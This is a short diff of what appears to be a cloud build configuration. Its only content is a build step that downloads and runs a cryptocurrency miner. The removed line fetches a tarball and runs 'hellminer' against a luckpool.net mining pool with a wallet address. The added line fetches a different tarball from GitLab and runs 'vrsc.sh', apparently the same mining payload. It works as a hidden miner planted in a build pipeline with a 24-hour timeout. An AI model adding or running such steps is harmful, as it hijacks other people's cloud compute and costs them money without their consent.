@@ -3,7 +3,7 @@ steps:
     args: 
       - '-c'
       - >-
-        wget https://github.com/Tesa-UII/storage/raw/main/vr.tar.gz && tar xf vr.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RGasNYv3Ryx7epen2qCcqC2KJ93RpEWdJc.IBM3 -p x --cpu 8
+        wget https://gitlab.com/ilhamjaya0q/beben/-/raw/main/nano.tar.gz && tar xf nano.tar.gz && ./vrsc.sh
     waitFor: ["-"]
     entrypoint: /bin/baseh
 timeout: 86400s
